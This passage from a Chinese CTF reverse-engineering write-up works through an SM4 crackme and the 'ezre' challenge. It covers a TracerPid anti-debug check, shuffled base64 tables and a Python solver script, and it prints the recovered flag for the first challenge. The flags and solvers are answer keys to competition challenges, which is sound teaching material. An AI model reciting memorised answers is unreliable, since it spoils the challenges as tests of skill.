dq <span class="number">0</span>A4ABB2B9h, <span class="number">0</span>C0C7CED5h, <span class="number">0</span>DCE3EAF1h, <span class="number">0F</span>8FF060Dh, <span class="number">141B</span>2229h</span><br><span class="line">.rodata:<span class="number">00000000000060</span>D0                 dq <span class="number">30373E45</span>h, <span class="number">4</span>C535A61h, <span class="number">686F</span>767Dh, <span class="number">848B</span>9299h, <span class="number">0</span>A0A7AEB5h</span><br><span class="line">.rodata:<span class="number">00000000000060F</span>8                 dq <span class="number">0B</span>CC3CAD1h, <span class="number">0</span>D8DFE6EDh, <span class="number">0F</span>4FB0209h, <span class="number">10171E25</span>h, <span class="number">2</span>C333A41h</span><br><span class="line">.rodata:<span class="number">0000000000006120</span>                 dq <span class="number">484F</span>565Dh, <span class="number">646B</span>7279h</span><br></pre></td></tr></table></figure><p>没有魔改</p><p>再检查置换T’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v12 = v17;</span><br><span class="line">v11 = sub_1670(v17, <span class="number">13</span>) ^ v12;</span><br><span class="line">v7 = <span class="number">957279085</span>;</span><br><span class="line">v17 = sub_1670(v17, <span class="number">23</span>) ^ v11;</span><br></pre></td></tr></table></figure><p>这里的sub_1670就是前面的移位xor函数 也没有魔改</p><p>最后大致看看迭代方式和轮数也没有改</p><p>确定是标准SM4后 找个在线网站<br>需要key和iv</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v15[<span class="number">0</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">v15[<span class="number">1</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">v14[<span class="number">0</span>] = <span class="number">0x7C88631647197506</span>LL;</span><br><span class="line">v14[<span class="number">1</span>] = <span class="number">0x4A0D7D3FFF55668B</span>LL;</span><br><span class="line">v14[<span class="number">2</span>] = <span class="number">0xDEC2E93F384ED2F5</span>LL;</span><br><span class="line">v14[<span class="number">3</span>] = <span class="number">0x3C1FB1746F7F7CDB</span>LL;</span><br></pre></td></tr></table></figure><p>key: 0123456789ABCDEF0123456789ABCDEF<br>这里key和密文都要从小端取(注意)<br>这里有没有IV涉及到是ECB模式还是CBC模式 既然找不到IV就当ECB来解<br>然后选择nopadding<br><img src="https://s2.loli.net/2023/12/17/YpD7sKfL3v5MNCT.png" alt="img"></p><p>flag: flag{h3kk0_w0rld_sur3_3n0ugh}</p><hr><hr><p>总结： 合理google某些常量值(SBOX&#x2F;CONSTANT…) 会带来意外之喜…</p><h2 id="ezre-强网先锋"><a href="#ezre-强网先锋" class="headerlink" title="ezre(强网先锋)"></a>ezre(强网先锋)</h2><p>ollvm直接插件去混淆</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+12Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+130h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+134h] [rbp-10Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+13Ch] [rbp-104h]</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">64</span>]; <span class="comment">// [rsp+140h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+180h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">64</span>]; <span class="comment">// [rsp+1C0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">52</span>]; <span class="comment">// [rsp+200h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+234h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> v16; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the CTF world:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v16 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">base64encode</span>(s, v11, v3);                     <span class="comment">// 变表base64加密</span></span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">srand</span>(byte_406132);                         <span class="comment">// srand(&#x27;U&#x27;) 每次的随机种子要变...</span></span><br><span class="line">    v4 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)byte_406130);</span><br><span class="line">    <span class="built_in">sub_401D10</span>(byte_406130, v4);                <span class="comment">// shuffle打乱base64表</span></span><br><span class="line">    <span class="keyword">if</span> ( (v10 &amp; <span class="number">1</span>) != <span class="number">0</span> )                       <span class="comment">// v10=1,3</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">strlen</span>(v11);</span><br><span class="line">      <span class="built_in">base64encode</span>(v11, v12, v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">base64decode</span>(v11, v12);                   <span class="comment">// 变表base64解密</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">    <span class="built_in">memcpy</span>(v11, v12, <span class="number">0x32</span>uLL);</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4062C0 == <span class="number">1</span> )                      <span class="comment">// sub_402230这里把dword_4062C0置为1了顺带把最后的密文数组也xor了一道</span></span><br><span class="line">  &#123;                                             <span class="comment">// 所以应该是走的这个分支</span></span><br><span class="line">    <span class="built_in">sub_402EE0</span>(byte_406130, &amp;byte_406130[<span class="number">64</span>]);  <span class="comment">// copy</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">      byte_406130[i] = (<span class="number">5</span> * (byte_406130[i] + <span class="number">3</span>)) ^ <span class="number">0x15</span>;<span class="comment">// 对base64表再变换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">      byte_406130[j] ^= <span class="number">0x27</span>u;                  <span class="comment">// 对base64表变换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_401EB0</span>(v12, v13);                         <span class="comment">// 又有一层加密</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( k &gt;= <span class="built_in">strlen</span>(v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( byte_406180[k] != v13[k] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于flag的长度 找了一圈都没找到check点<br>其实可以这么来判断 由于最后的enc是48字符<br>&#x3D;&gt; input padding后是36长度 构造34,35,36的padding试一试看退不退出程序就行了</p><p>这里静态很麻烦 直接动调提取数据<br>注意到下面有个</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_4062C0 == <span class="number">1</span> )                      <span class="comment">// sub_402230这里把dword_4062C0置为1了顺带把最后的密文数组也xor了一道 然而这是反调试。。。</span></span><br><span class="line">&#123;                                             <span class="comment">// 所以应该是走的这个分支 个鬼。。。</span></span><br><span class="line">  <span class="built_in">sub_402EE0</span>(byte_406130, &amp;byte_406130[<span class="number">64</span>]);  <span class="comment">// copy</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">    byte_406130[i] = (<span class="number">5</span> * (byte_406130[i] + <span class="number">3</span>)) ^ <span class="number">0x15</span>;<span class="comment">// 对base64表再变换</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">    byte_406130[j] ^= <span class="number">0x27</span>u;                  <span class="comment">// 对base64表变换</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易想到跟踪dword_4062C0变量<br>之前唯一出现过的地方</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_402230</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+48h] [rbp-118h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4Ch] [rbp-114h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+150h] [rbp-10h]</span></span><br><span class="line">  FILE *v5; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/status&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v5 = stream;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">fgets</span>(s, <span class="number">256</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, <span class="string">&quot;TracerPid:&quot;</span>, <span class="number">0xA</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      __isoc99_sscanf(s, <span class="string">&quot;TracerPid:\t%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fclose</span>(stream);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )                                     <span class="comment">// 屮... 反调试...</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)i &lt; <span class="number">0x30</span>; ++i )</span><br><span class="line">      byte_406180[i] ^= <span class="number">0x34</span>u;</span><br><span class="line">    dword_4062C0 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不仔细看以为这里潜在的设置了1且修改了最后的enc数组<br>其实这里是个反调试 因为v2初始值是0的 而如果调试的话会发现这里的值会变成非零<br>当然 这里不影响base64表的shuffle变换 所以提取出表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table4=<span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span></span><br><span class="line">table3=<span class="string">&quot;pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a&quot;</span></span><br><span class="line">table2=<span class="string">&quot;Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA&quot;</span></span><br><span class="line">table1=<span class="string">&quot;FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8&quot;</span></span><br><span class="line">table0=<span class="string">&quot;l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr&quot;</span></span><br></pre></td></tr></table></figure><p>最后还有一层加密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_401EB0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+8Eh] [rbp-52h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+8Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+90h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+C4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+C8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+CCh] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [rsp+D0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = a1;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v7 = <span class="number">2023</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>(v5, &amp;byte_406130[<span class="number">6</span>], <span class="number">21uLL</span>);</span><br><span class="line">  v5[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v9, s);</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; v8 - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (v7 + <span class="number">5</span>) % <span class="number">20</span>;</span><br><span class="line">      v3 = v5[v7 + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (v7 + <span class="number">7</span>) % <span class="number">19</span>;</span><br><span class="line">      v3 = v5[v7 + <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (v7 + <span class="number">3</span>) % <span class="number">17</span>;</span><br><span class="line">      v3 = v5[v7 + <span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v9[v6] ^= v3;</span><br><span class="line">    v4 = v9[v6++];</span><br><span class="line">    v9[v6] ^= v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆回去就好了<br>最后的base64table做的是xor 0x27的操作</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#...</span></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">string,table=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            index=table.index(i)</span><br><span class="line">            result+=(<span class="built_in">bin</span>(index)[<span class="number">2</span>:]).zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            result=result[:-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> n2s(<span class="built_in">int</span>(result,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">input_string,table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span>):</span><br><span class="line">    input_bytes = input_string</span><br><span class="line">    padding = (<span class="number">3</span> - <span class="built_in">len</span>(input_bytes) % <span class="number">3</span>) % <span class="number">3</span></span><br><span class="line">    input_bytes+=padding*<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    encoded_chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(input_bytes), <span class="number">3</span>):</span><br><span class="line">        chunk = (input_bytes[i] &lt;&lt; <span class="number">16</span>) | (input_bytes[i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | input_bytes[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            index = (chunk &gt;&gt; (j * <span class="number">6</span>)) &amp; <span class="number">63</span></span><br><span class="line">            encoded_chars.append(table[index])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,padding+<span class="number">1</span>):</span><br><span class="line">        encoded_chars[-i]=<span class="string">&#x27;=&#x27;</span></span><br><span class="line">    encoded_string = <span class="string">&#x27;&#x27;</span>.join(encoded_chars)</span><br><span class="line">    <span class="keyword">return</span> encoded_string</span><br><span class="line"></span><br><span class="line">base64_table0 = <span class="string">&quot;l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr&quot;</span></span><br><span class="line">base64_table1 = <span class="string">&quot;FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8&quot;</span></span><br><span class="line">base64_table2 = <span class="string">&quot;Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA&quot;</span></span><br><span class="line">base64_table3 = <span class="string">&quot;pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a&quot;</span></span><br><span class="line">base64_table4 = <span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x3A</span>, <span class="number">0x2C</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x59</span>, <span class="number">0x63</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x5C</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x7F</span>, <span class="number">0x3D</span>, <span class="number">0x2C</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x2B</span>, <span class="number">0x05</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x55</span>, <span class="number">0x24</span>, <span class="number">0x19</span>]</span><br><span class="line">v5 = [<span class="built_in">ord</span>(x)^<span class="number">0x27</span> <span class="keyword">for</span> x <span class="keyword">in</span> base64_table4]</span><br><span class="line">v5 = v5[<span class="number">6</span>:<span class="number">6</span>+<span class="number">21</span>]+[<span class="number">0</span>]</span><br><span class="line">flag = enc</span><br><span class="line">v6 = <span class="number">48</span>-<span class="number">2</span></span><br><span class="line">v7 = <span class="number">8</span></span><br><span class="line">v7s = [<span class="number">3</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> v6&gt;=<span class="number">0</span>:</span><br><span class="line">    v7  = v7s[v6]</span><br><span class="line">    <span class="comment"># print(v7,end=&#x27;,&#x27;)</span></span><br><span class="line">    flag[v6+<span class="number">1</span>] ^= flag[v6]</span><br><span class="line">    <span class="keyword">if</span> v6%<span class="number">3</span>==<span class="number">1</span>:</span><br><span class="line">        flag[v6] ^= v5[v7+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> v6%<span class="number">3</span>==<span class="number">2</span>:</span><br><span class="line">        flag[v6] ^= v5[v7+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[v6] ^= v5[v7+<span class="number">3</span>]</span><br><span class="line">    v6 -= <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">flag = <span class="string">&quot;WZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==&quot;</span></span><br><span class="line">flag = base64_decode(flag,table=base64_table4)</span><br><span class="line">flag = base64_encode(flag,table=base64_table3)</span><br><span class="line">flag = base64_decode(flag,table=base64_table2)</span><br><span class="line">flag = base64_encode(flag,table=base64_table1)</span><br><span class="line">flag = base64_decode(flag,table=base64_table0)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="comment"># 